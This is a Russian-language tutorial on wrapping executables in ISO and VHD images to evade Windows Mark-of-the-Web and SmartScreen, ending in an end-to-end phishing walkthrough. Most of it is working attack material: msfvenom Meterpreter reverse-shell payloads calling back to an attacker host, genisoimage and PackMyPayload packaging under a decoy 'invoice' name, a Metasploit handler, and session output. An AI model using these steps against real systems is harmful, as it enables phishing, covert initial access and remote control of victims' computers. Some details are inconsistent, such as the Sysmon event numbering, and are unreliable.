# ISO и IMG обёртки для обхода Mark-of-the-Web

## 1. Mark-of-the-Web и контейнерные форматы: природа обхода

**Mark-of-the-Web (MOTW)** — механизм безопасности Windows, добавляющий в альтернативный поток NTFS (Zone.Identifier) файлам, полученным из недоверенных источников (Интернет, вложения Outlook, загрузки браузеров). Идентификатор зоны `ZoneId=3` соответствует зоне «Интернет» и активирует цепочку защит: SmartScreen, проверку подписи, блокировку макросов, предупреждения при запуске исполняемых файлов [Microsoft Zone.Identifier Streams](https://learn.microsoft.com/en-us/windows/win32/seccrypto/zone-identifier-streams). При сохранении вложения из фишингового письма или скачивании двоичного файла браузером в его метаданных появляется ADS `:Zone.Identifier`, который система считывает при попытке выполнения.

Контейнерные форматы — ISO‑образы, IMG‑файлы (raw‑образы дисков, VHD/VHDX) — способны обходить MOTW благодаря способу их обработки операционной системой. Приложение файла-контейнера само по себе может получить метку зоны, однако файлы внутри смонтированного образа наследуют свойства **локального тома**, а не метку скачанного архива. Таким образом, исполняемый файл, запущенный с виртуального диска, **не имеет альтернативного потока Zone.Identifier** и, следовательно, не вызывает предупреждений SmartScreen, даже если сам контейнер был загружен из интернета.

Важно разграничить понятия «обёртка» и «архив». ZIP- или RAR-архивы при распаковке традиционно сохраняли MOTW на извлечённых файлах (поведение зависит от реализации распаковщика). В отличие от них, ISO/IMG создают точку монтирования — новый том, и операционная система рассматривает его как локальное устройство, игнорируя метку контейнера. Это и формирует фундамент техники **T1553.005 Subvert Trust Controls: Mark-of-the-Web Bypass** по классификации MITRE ATT&CK [MITRE T1553.005](https://attack.mitre.org/techniques/T1553/005/).

```powershell
# Просмотр альтернативного потока Zone.Identifier у файла, скачанного из Интернета
Get-Item .\malware.exe -Stream Zone.Identifier | Get-Content
```

Ожидаемый вывод (иллюстративная схема — значения зависят от среды):
```
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://malicious.example.com/payload.exe
HostUrl=https://malicious.example.com/payload.exe
```

У файла, извлечённого из смонтированного ISO-образа, подобный поток отсутствует, что иллюстрирует сравнительная таблица:

| Способ доставки                     | Наличие MOTW у конечного исполняемого файла | Причина                                          |
|-------------------------------------|---------------------------------------------|--------------------------------------------------|
| Прямая загрузка по HTTP/HTTPS       | ZoneId=3 (ADS присутствует)                 | Браузер или Attachment Manager создаёт ADS        |
| Извлечение из ZIP-архива (Explorer) | ZoneId=3 (может сохраняться)                | Механизм распаковки копирует метку архива         |
| Монтирование ISO-образа             | **отсутствует**                             | Файл на виртуальном томе наследует свойства локального диска |
| Монтирование VHD/VHDX-образа       | **отсутствует**                             | Аналогично ISO — том считается физическим          |
| Копирование с USB-накопителя        | Отсутствует                                | Съёмные носители — зона Local Intranet или Trusted |

## 2. Внутренняя структура ISO и IMG как контейнеров доставки

Для понимания, почему именно монтируемые образы обходят MOTW, необходимо рассмотреть их внутреннее устройство и способы взаимодействия операционной системы с ними.

### 2.1 ISO-образ (ISO 9660 / UDF)

ISO-образы — побайтовые копии оптических дисков, структурированные по стандартам ISO 9660 (с расширениями Joliet для длинных имён) или Universal Disk Format (UDF). Вредоносные кампании используют как классический ISO 9660, так и гибридные образы, совместимые с проводником Windows.

Логическая структура ISO 9660 включает:
- **System Area** (первые 32 КБ) — загрузочные сектора, могут быть пустыми.
- **Volume Descriptors** — серия дескрипторов, заканчивающаяся Terminator Set. Основной — Primary Volume Descriptor (PVD) по смещению 32768 (0x8000).
- **Path Table** и **Directory Records** — описывают иерархию файлов.
- **Data Area** — полезная нагрузка (файлы).

Ключевые поля PVD (иллюстративная схема):

```text
Offset  Size  Field
0x0000  1     Descriptor Type (1 = Primary)
0x0001  5     Standard Identifier ("CD001")
0x0008  32    System Identifier
0x0028  32    Volume Identifier
0x0050  8     Volume Space Size (общее число логических блоков)
...
0x008c  4     Path Table Size
0x0090  4     Location of Type L Path Table
0x0094  4     Location of Type M Path Table
```

Для создания совместимого ISO, который корректно монтируется в Windows, достаточно разместить минимально необходимые структуры. Встроенных средств генерации ISO в Windows нет, но утилитой `mkisofs` (из комплекта cdrtools) или её форком `genisoimage` на Linux задача решается одной командой. Вредоносные сборщики часто включают собственный генератор на Python/Go, порождающий ISO-файл «на лету».

```bash
# Создание ISO-образа с файлом payload.exe (на Linux)
genisoimage -o payload.iso -R -J -hfs /path/to/payload.exe
```

Флаги `-R` (Rock Ridge) и `-J` (Joliet) обеспечивают совместимость с различными ОС, `-hfs` — дополнительная поддержка Mac. В Windows полученный образ монтируется двойным кликом и отображается как CD/DVD-ROM.

После монтирования ISO (например, двойным кликом в проводнике) виртуальный привод получает букву, и файлы доступны по обычным путям. Поскольку операция монтирования осуществляется через драйвер `cdfs.sys` или сторонние виртуальные приводы, файлы внутри считаются «локальными». Проверка MOTW на них не выполняется, что подтверждает отсутствие альтернативного потока:

```powershell
# Монтирование ISO и проверка наличия Zone.Identifier на извлечённом файле
Mount-DiskImage -ImagePath "C:\Users\User\Desktop\payload.iso"
$drive = (Get-DiskImage -ImagePath "C:\Users\User\Desktop\payload.iso" | Get-Volume).DriveLetter + ":\"
Get-Item "$drive\payload.exe" -Stream Zone.Identifier  # ошибка: поток не найден
```

Вывод: ошибка о том, что поток не существует, означает обход MOTW.

### 2.2 IMG-обёртки (raw-образы и VHD)

IMG — общее название для побайтовых образов дисков, обычно содержащих файловую систему FAT или NTFS. В контексте обхода MOTW часто применяются образы в формате VHD (Virtual Hard Disk) или VHDX, которые поддерживаются Windows нативно, начиная с Windows 7/2008 R2. VHD-файлы можно монтировать двойным кликом или через управление дисками, при этом ОС рассматривает их как физические диски.

Образ VHD содержит:
- Footer (512 байт) с сигнатурой "conectix" и геометрией диска.
- Заголовок (для динамических VHD) с таблицей блоков.
- Полезную нагрузку — структуру разделов (MBR/GPT) и файловую систему, например NTFS.

Создание VHD с нужным содержимым автоматизировано утилитами наподобие PackMyPayload [PackMyPayload GitHub](https://github.com/mgeeky/PackMyPayload). Пример команды:

```powershell
# Создание VHD-контейнера с полезной нагрузкой (PackMyPayload)
PackMyPayload.py --type vhd --out evil.vhd --payload meterpreter.exe
```

После отправки жертве и монтирования VHD-файла содержимое появляется как новый диск. Запуск `meterpreter.exe` с этого диска также не приводит к появлению MOTW, обходя SmartScreen.

ASCII-схема взаимодействия:

```text
[Жертва скачивает evil.vhd]
       │
       ▼
[Монтирование: Disk Management / Mount-DiskImage]
       │
       ▼
[Создание тома с буквой E:]
       │
       ├──(запуск)──▶ e:\meterpreter.exe
       │                  ├── SmartScreen: отключён / MOTW нет
       └──(чтение ADS)──▶ Zone.Identifier отсутствует
```

Важное отличие: VHD-контейнер может использовать файловую систему с поддержкой альтернативных потоков (NTFS), но поскольку том смонтирован как локальный, зона для файлов не устанавливается. Таким образом, даже если файловая система способна хранить ADS, механизмы защиты не добавляют MOTW к файлам внутри образа, потому что источником данных является виртуальный диск, а не интернет-протокол.

## 3. Применение ISO и IMG обёрток в доставке пейлоада: инструменты и реальные сценарии

Техника упаковки вредоносного ПО в ISO/IMG-образы стала стандартным приёмом в фишинговых кампаниях начиная с 2021–2022 годов. Её активно применяют операторы таких вредоносных семейств, как **BazarLoader**, **IcedID**, **Emotet**, **Bumblebee** и многие другие. Ниже представлен обзор инструментов и типовых операций.

### 3.1 Инструментарий пентестера

Для оперативного создания обёрток используются:

- **PackMyPayload** (Python) — поддерживает ISO, VHD, VHDX, 7z, ZIP. Позволяет встроить payload, добавить отвлекающие документы, настроить автоматическое монтирование через скрипт.
- **Out-Skelta** (PowerShell) — модуль для имплантации полезной нагрузки в ISO/VHD, часто применяется в red team операциях.
- **genisoimage / mkisofs** — стандартные утилиты *nix, встроенные в C2-фреймворки.
- **Windows-встроенные средства**: `New-VHD`, `Mount-DiskImage`, `DiskPart`. Хотя прямого создания ISO нет, vhdx-образы удобно генерировать через PowerShell.

Пример быстрого создания ISO с Meterpreter-полезной нагрузкой на Kali Linux, используя msfvenom и genisoimage:

```bash
# Генерация EXE-пейлоада
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe
# Упаковка в ISO
genisoimage -o invoice.iso -R -J shell.exe
```

Полученный `invoice.iso` может распространяться через фишинг как «счёт-фактура» (invoice). При клике на ISO в Windows 10/11 образ автоматически монтируется и открывается папка с `shell.exe`. Жертва, введённая в заблуждение, запускает файл без каких-либо предупреждений, если SmartScreen не блокирует по репутации (см. ниже).

### 3.2 Особенности обхода SmartScreen и MOTW

Хотя MOTW отсутствует, SmartScreen всё ещё проверяет исполняемый файл по базе репутации (App Reputation). Однако на практике многие вредоносные кампании используют свежесобранные образцы, подписанные действующими сертификатами, или применяют технику «возраста файла» (time stomping), чтобы улучшить репутацию. Основной выигрыш от обхода MOTW — снятие маркера «этот файл из Интернета», который сразу вызывает предупреждение «Защитник Windows предотвратил запуск неизвестного приложения». Без MOTW исполнение начинается без дополнительных запросов, а если файл подписан или достаточно «стар» (в локальной базе репутации), SmartScreen вообще не активируется.

Дополнительный уровень — обход блокировки макросов в документах, помещённых в ISO. Например, если в образе лежит документ Office с макросом, то при открытии его напрямую с локального тома (после монтирования) MOTW нет, и макросы могут быть разрешены политикой, которая запрещает макросы только для файлов из Интернета (Mark of the Web). Это расширяет поверхность атаки.

Проверка репутации и MOTW на практике (на тестовой системе):

```powershell
# Создаём VHD с тестовым исполняемым файлом
$vhd = New-VHD -Path C:\temp\payload.vhd -Fixed -SizeBytes 200MB
Mount-VHD -Path C:\temp\payload.vhd
Initialize-Disk -Number (Get-VHD -Path C:\temp\payload.vhd).DiskNumber -PartitionStyle MBR
New-Partition -DiskNumber (Get-VHD -Path C:\temp\payload.vhd).DiskNumber -UseMaximumSize -AssignDriveLetter
Format-Volume -DriveLetter D -FileSystem NTFS -NewFileSystemLabel "Data"
Copy-Item C:\temp\shell.exe D:\
Dismount-VHD -Path C:\temp\payload.vhd
# Отправляем payload.vhd жертве
```

На машине жертвы после монтирования и запуска `shell.exe` Sysmon-лог (Event ID 1) покажет процесс, но не будет события создания потока Zone.Identifier (Event ID 11 с TargetFilename). Пример строки события Sysmon (Event ID 1):

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{...}" />
    <EventID>1</EventID>
    <Version>5</Version>
    ...
  </System>
  <EventData>
    <Data Name="Image">D:\shell.exe</Data>
    <Data Name="CommandLine">"D:\shell.exe"</Data>
    <Data Name="User">DESKTOP-ABC\victim</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
  </EventData>
</Event>
```

Отсутствие предшествующего Event ID 15 (Stream creation) для `shell.exe` подтверждает обход.

### 3.3 Типовые ошибки и подводные камни

- **Расширение файла .img**: системы могут не ассоциировать .img с монтированием, и для исполнения может потребоваться дополнительное взаимодействие пользователя. Предпочтительнее .iso или .vhd.
- **Образ без файловой системы**: raw IMG без разметки не смонтируется автоматически — нужен MBR/GPT.
- **Встроенный антивирус**: некоторые EDR отслеживают монтирование образов и проверяют файлы внутри. Современные защитные решения научились эвристически анализировать ISO при поступлении (особенно в Exchange/Defender), поэтому тренд смещается в сторону контейнеров, шифрующих содержимое, например VHDX с BitLocker.
- **Запуск из командной строки против двойного клика**: если жертва использует командную строку для запуска файла с виртуального диска, поведение не меняется — MOTW всё равно отсутствует.

## 4. Сквозной практический пример: фишинговая доставка Meterpreter через ISO-образ

**Исходные условия:** тестовая инфраструктура с атакующей машиной (Kali Linux) и жертвой (Windows 10 22H2, все обновления, встроенный Защитник активен, SmartScreen в режиме «Предупреждать»). Цель — получить сессию Meterpreter, обойдя предупреждения MOTW. Сценарий: жертва получает электронное письмо с темой «Ваш заказ #4521 — счет-фактура» и вложением `invoice.iso`, скачивает его и открывает двойным кликом.

### Шаг 1. Создание полезной нагрузки и упаковка в ISO

На Kali генерируем EXE-полезную нагрузку и создаём ISO-файл:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=443 -f exe -o invoice_viewer.exe
genisoimage -o invoice.iso -R -J invoice_viewer.exe
```

Вывод команды `genisoimage` (ожидаемый):

```
Total translation table size: 0
Total rockridge attributes bytes: 0
Total directory bytes: 0
Path table size(bytes): 10
Max brk space used 0
182 extents written (0 MB)
```

ISO-файл готов. На атакующей машине настраиваем обработчик:

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 443; run"
```

### Шаг 2. Доставка и монтирование на стороне жертвы

Жертва сохраняет вложение в папку «Загрузки» (путь: `C:\Users\victim\Downloads\invoice.iso`). При двойном клике Windows монтирует образ в первый свободный привод, например `D:\`. Откроется окно проводника с файлом `invoice_viewer.exe`. В этот момент система **не создаёт** альтернативный поток Zone.Identifier для `invoice_viewer.exe`, хотя сам `invoice.iso` его имеет (как файл из Интернета). Проверим отсутствие MOTW на целевом файле.

```powershell
Get-Item D:\invoice_viewer.exe -Stream * | Select-Object Stream
```

Вывод (ожидаемый):

```
Stream
------
:$DATA
```

Отсутствует `:Zone.Identifier`. Теперь тот же самый EXE, но скачанный напрямую через браузер в ту же папку, показал бы поток `:Zone.Identifier:$DATA`.

### Шаг 3. Запуск исполняемого файла с виртуального диска

Жертва дважды кликает `invoice_viewer.exe`. Поскольку у файла нет MOTW, SmartScreen **не показывает** предупреждение «Windows защитила ваш компьютер» (которое обычно появляется для неизвестных файлов из Интернета). Вместо этого сразу происходит выполнение. Sysmon регистрирует:

```xml
<Event>
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">D:\invoice_viewer.exe</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="CommandLine">"D:\invoice_viewer.exe"</Data>
  </EventData>
</Event>
```

Нет предшествующего события создания Zone.Identifier (нет event ID 11 с `TargetFilename` = `D:\invoice_viewer.exe`).

### Шаг 4. Установка Meterpreter-сессии и закрепление

На атакующей стороне:

```
[*] Started reverse TCP handler on 192.168.1.10:443
[*] Sending stage (200262 bytes) to 192.168.1.20
[*] Meterpreter session 1 opened (192.168.1.10:443 -> 192.168.1.20:49817)
```

Сессия получена в обход MOTW. Дальнейшие действия могут включать миграцию в другой процесс, повышение привилегий, закрепление. Ключевое преимущество достигнуто: первоначальное предупреждение безопасности не остановило пользователя и не предупредило защитную инфраструктуру (на базе событий ADS).

### Ожидаемый вывод

Сквозной пример демонстрирует, что ISO-контейнер полностью устраняет MOTW для исполняемого файла начиная с этапа доставки, позволяя добиться бесшумного старта вредоносной программы без всплывающих окон SmartScreen, связанных с зоной Интернета. Этот метод по-прежнему актуален для современных версий Windows 10/11 и часто используется в реальных атаках.
